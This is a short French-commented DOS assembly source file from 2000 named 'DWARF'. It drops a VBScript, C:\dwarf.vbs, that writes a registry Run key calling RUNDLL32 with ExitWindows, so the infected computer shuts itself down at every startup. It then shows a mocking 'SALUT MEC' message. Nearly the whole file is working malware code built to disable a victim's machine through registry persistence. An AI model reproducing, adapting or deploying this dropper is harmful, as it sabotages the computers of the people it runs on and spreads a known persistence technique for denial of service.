;TAILLE : 475 OCTETS                                            31/08/00
;DWARF cr‚e un fichier dwarf.vbs qui ajoutera une cl‚ afin
;que l'ordinateur s'‚teigne au d‚marrage
.model small
.code
org 100h

DEBUT :         mov ah,09h              ;affiche un message
                lea dx,text1            ;avec deux proposition
                int 21h

TOUCHE:         mov ah,1                ;lecture du caractŠre
                int 21h
                cmp al,'C'
                je CREER_FICHIER
                cmp al,'c'
                je CREER_FICHIER        ;si 'C-c' on continue
                cmp al,'Q'
                je FIN_PROGRAMME
                cmp al,'q'
                je FIN_PROGRAMME        ;si 'Z-z' on stop
                mov dx,offset bad       ;mauvaise touche
                mov ah,9h
                int 21h
                jmp TOUCHE

CREER_FICHIER:  mov ah,3Ch              ;CREE UN FICHIER
                xor cx,cx
                mov dx,offset NOM       ;ET LUI DONNE UN NOM
                int 21h
ECRIRE_FICHIER: xchg ax,bx
                mov ah,40h              ;ECRIT DANS LE FICHIER
                mov cx,meslen
                mov dx,offset note
                int 21h
FERMER_FICHIER: mov ah,3Eh              ;PUIS LE REFERME
                int 21h
                mov dx,offset updir     ;CHANGEMENT DE REPERTOIRE 
                mov ah,3Bh
                int 21h

MESSAGE:        mov ah,09h              ;AFFICHE LE MESSAGE
                lea dx,msg
                int 21h

FIN_PROGRAMME : mov ah,4Ch              ;FERME LE PROGRAMME
                int 21h

text1   db 10,13,'Tape C pour continuer ou Q pour quitter : $'
bad     db 7,7,8,' ',8,24h
NOM     db 'c:\dwarf.vbs',0
updir   db '..',0
msg     db 7,7,7,10,13,'SALUT MEC !!!!'
        db 10,10,13,'UN FICHIER A ETE RAJOUTE'
        db 10,13,'IL SE NOMME C:\dwarf.vbs $'
note    db 'rem DwArF.vbs by Panda '
        db '(c) 2000'
prog    db 'Dim WSHShell',0Dh,0Ah
        db 'Set WSHShell = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'WSHShell.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\'
        db 'Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE '
        db 'C:\Windows\system\User.exe,ExitWindows"'

meslen  equ $-note

end DEBUT
